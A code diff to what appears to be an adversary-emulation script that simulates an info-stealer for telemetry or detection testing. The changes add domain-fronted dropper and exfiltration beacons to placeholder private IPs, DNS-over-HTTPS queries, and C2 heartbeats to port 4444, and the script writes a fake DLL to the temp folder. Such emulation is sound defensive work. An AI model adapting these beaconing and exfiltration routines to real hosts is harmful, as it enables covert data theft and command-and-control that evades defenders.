@@ -25,6 +25,7 @@ from datetime import datetime, timezone
 from pathlib import Path
 
 from telemetry_helper import check_environment, emit, EnvSafety, set_phase, jitter
+from c2_helper import emit_doh_query, emit_heartbeats, fronted_beacon, jittered_sleep, FRONT_DOMAINS
 
 
 EXFIL_SERVERS = ["10.13.37.50", "10.13.37.51"]
@@ -128,27 +129,27 @@ def main() -> int:
                 pass
             jitter(0.15, 0.15)
 
-    # --- Phase 4: Dropper ---
+    # --- Phase 4: Dropper (domain-fronted) ---
     set_phase("dropper")
-    payload_url = f"http://{random.choice(EXFIL_SERVERS)}:8080/payload.dll"
-    emit("NETWORK", "CONNECT", payload_url, "CRITICAL",
+    dropper_ip = random.choice(EXFIL_SERVERS)
+    front = random.choice(FRONT_DOMAINS)
+    emit("NETWORK", "CONNECT", f"{dropper_ip}:8080", "CRITICAL",
          source_process="stealer.exe", protocol="HTTP", method="GET",
-         detail="Downloading secondary payload (dropper)", technique_id="T1105")
-    try:
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.settimeout(3)
-        sock.connect((EXFIL_SERVERS[0], 8080))
-        sock.send(b"GET /payload.dll HTTP/1.1\r\nHost: c2.local\r\n\r\n")
-        sock.close()
-    except (ConnectionRefusedError, OSError, socket.timeout):
-        pass
+         detail="Downloading secondary payload (fronted dropper)", technique_id="T1105")
+    emit("NETWORK", "DOMAIN_FRONT", front, "WARNING",
+         source_process="stealer.exe", target_host=front, target_ip=dropper_ip,
+         detail=f"Domain fronting via {front} → {dropper_ip}", technique_id="T1090")
+
+    fronted_beacon(dropper_ip, 8080, front,
+                   {"type": "dropper", "payload": "msupdate.dll"})
+    emit_doh_query("update.telemetry-service.local", process_name="stealer.exe")
 
     payload_path = Path(os.environ.get("TEMP", r"C:\Windows\Temp")) / "msupdate.dll"
     payload_path.write_bytes(b"MZ" + os.urandom(1024))
     emit("FILE", "CREATE_FILE", str(payload_path), "CRITICAL",
          source_process="stealer.exe", size=1026, detail="Secondary payload written")
 
-    # --- Phase 5: Exfiltration ---
+    # --- Phase 5: Exfiltration + C2 heartbeat ---
     if env != EnvSafety.SUSPICIOUS:
         set_phase("exfiltration")
         stolen_files = list(staging_dir.iterdir()) if staging_dir.exists() else []
@@ -156,18 +157,22 @@ def main() -> int:
             if not f.is_file():
                 continue
             server = random.choice(EXFIL_SERVERS)
+            front = random.choice(FRONT_DOMAINS)
             emit("NETWORK", "EXFILTRATE", f"{server}:443", "CRITICAL",
                  source_process="stealer.exe", protocol="HTTPS", method="POST",
                  file=f.name, size=f.stat().st_size,
-                 detail=f"Exfiltrating {f.name} to C2", technique_id="T1041")
-            try:
-                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                sock.settimeout(2)
-                sock.connect((server, 443))
-                sock.close()
-            except (ConnectionRefusedError, OSError, socket.timeout):
-                pass
-            jitter(0.3, 0.4)
+                 detail=f"Exfiltrating {f.name} to C2 (fronted: {front})", technique_id="T1041")
+            emit("NETWORK", "DOMAIN_FRONT", front, "WARNING",
+                 source_process="stealer.exe", target_host=front, target_ip=server,
+                 detail=f"Domain fronting exfiltration via {front}", technique_id="T1090")
+
+            fronted_beacon(server, 443, front,
+                           {"type": "exfil", "file": f.name, "size": f.stat().st_size})
+            jittered_sleep(0.3, 0.4)
+
+        emit_heartbeats(EXFIL_SERVERS[0], 4444, count=3,
+                        process_name="stealer.exe",
+                        min_interval=5.0, max_interval=25.0)
 
     # --- Phase 6: Cleanup ---
     set_phase("anti_forensics")
